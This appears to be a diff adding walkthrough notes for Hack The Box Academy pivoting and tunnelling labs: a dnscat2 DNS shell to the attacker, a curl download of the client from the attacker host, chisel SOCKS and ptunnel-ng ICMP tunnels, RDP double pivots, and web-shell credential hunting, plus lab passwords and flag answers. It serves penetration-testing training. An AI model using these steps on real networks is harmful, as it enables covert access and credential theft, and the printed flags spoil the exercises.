@@ -2830,6 +2830,297 @@ xfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080
 
 Results: Jim Flipflop
 
+### Branching Out Our Tunn
+
+RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.
+
+```
+# In the kali attacker machine with ip $ip:
+##################################
+# Install the DNScat server
+git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+
+# Launch the server
+sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache
+
+# See the response after launching the server. The dns server will generate a secret that we will use from the victim machine to connect
+
+# Now, we need the client connection. As our targetted machine is Windows we download the powershell client dnscat2 to our kali
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques. In this case I initiated a http server from the folder where dnscat2.ps1 was
+python -m http.server 8000
+
+
+# Additionally, I opened a RDP connection with the windows machine:
+xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ip
+
+
+###########################################
+## From the windows machine. Open a powershell
+################
+# Download the dnscat2 powershell client:
+curl http://$ipAttackerMachine:8000/dnscat2.ps1 > dnscat2.ps1
+
+# Install
+Import-Module .\dnscat2.ps1
+
+# Initiate the connection
+Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
+# $secret is obtained from the server launched in the kali machne.
+
+###########################################
+## From the kali Attacker machine
+################
+# We will receive the message:
+# New window created: 1
+# Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+# Enter the session
+window -i 1
+
+# Retrieve the flag
+type C:\Users\htb-student\Documents\flag.txt
+```
+
+Results: AC@tinth3Tunnel
+
+SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.
+
+```
+#########
+# In the attacker machine
+#######
+git clone https://github.com/jpillora/chisel.git
+
+cd chisel
+go build
+
+
+# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.
+# You can run `go build -ldflags="-s -w"` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”).
+go build -ldflags="-s -w"
+
+# Copy the file to the target
+scp chisel ubuntu@$ip:~/
+
+# And connect to the machine
+ssh ubuntu@$ip
+
+
+#########
+# In the Ubuntu compromised machine, our Pivot Host
+#######
+
+./chisel server -v -p 1234 --socks5
+
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+
+
+ SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
+**Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**
+
+Results: `Th3$eTunne1$@rent8oring!`
+
+
+ **Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.**
+
+```shell-session
+#########
+# In the attacker machine
+#######
+git clone https://github.com/utoni/ptunnel-ng.git
+
+# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh
+sudo ./autogen.sh 
+
+# Another way to build the ptunnel-ng binary
+sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+
+# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host
+scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/
+
+# Connect to the ubuntu
+ssh ubuntu@$ipUbuntuCompromisedMachine
+```
+
+
+**2.** Start the ptunnel-ng Server on the Target Host
+
+```shell-session
+#########
+# In the Ubuntu compromised machine, our Pivot Host
+#######
+sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22
+```
+
+**3.** With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).
+
+```shell-session
+#########
+# In the attacker machine
+#######
+
+# Connecting to ptunnel-ng Server from Attack Host
+sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22
+```
+
+Now we can use proxychains with RDP to connect to the machine in the other network range:
+
+```shell-session
+# First, enable Dynamic Port Forwarding over SSH
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+# Now we can use proxychains with nmap
+proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19
+```
+
+Results: N3Tw0rkTunnelV1sion!
+
+
+### Double Pivots
+RDP to $ip with user "htb-student" and password "HTB_@cademy_stdnt!"
+**Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.**
+
+Our goal will be reaching the attacked machine 3. 
+
+**1.** First, we download appropriate binaries to our kali attack host:
+
+- [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
+- [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+
+
+**2.**  Attacking machine 1
+
+Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.
+
+From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. **Do it as Admin**
+
+```cmd-session
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+**3.** Attacking machine 2
+
+Now, from the machine 1, we can connect to machine 2  over RDP using `mstsc.exe`. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.
+
+**4.** Attacking machine 3
+
+Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.
+
+
+When done, **start SocksOverRDP-Server.exe with Admin privileges** in machine 2.
+
+When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.
+
+```cmd-session
+netstat -antb | findstr 1080
+```
+
+Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. 
+
+```
+Open proxifier and go to Profile > Proxy server. Click on "Add..."
+```
+
+With Proxifier configured and running, we can **start mstsc.exe**, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.
+
+So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.
+
+Results: H0pping@roundwithRDP!
+
+### Skill assessments
+A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:
+
+**Objectives**
+
+- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
+- Use the web shell access to enumerate and pivot to an internal host.
+- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
+- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
+- Grab `any/all` flags that can be found.
+
+
+**Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**
+
+```
+# Enumerate $ip
+sudo nmap $ip
+# It will return port 80 and 22. Open a browser and go to http://$ip. It's a reverse shell. 
+cd /home
+ls -la
+# You will get two users. Have a look at webadmin. 
+ls -la /home/webadmin
+# You will get a id_rsa file. Copy it to your kali machine and use it to connect again via ssh as webadmin
+ssh -i id_rsa webadmin@$ip
+```
+
+Results: webadmin
+
+
+**Submit the credentials found in the user's home directory. (Format: user:password)**
+
+```
+cat for-admin-eyes-only
+```
+
+Results: mlefay:Plain Human work!
+
+
+**Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**
+
+```
+ip a
+
+# Now we do a ping sweep
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+Results: 172.16.5.35
+
+
+**Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**
+
+```
+
+```
+
+Results: 
+
+
+**In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**
+
+```
+
+```
+
+Results: 
+
+
+**For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.**
+
+```
+
+```
+
+Results: 
+
+**Submit the contents of C:\Flag.txt located on the Domain Controller.**
+
+```
+
+```
+
+Results: 
 
 
 ## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
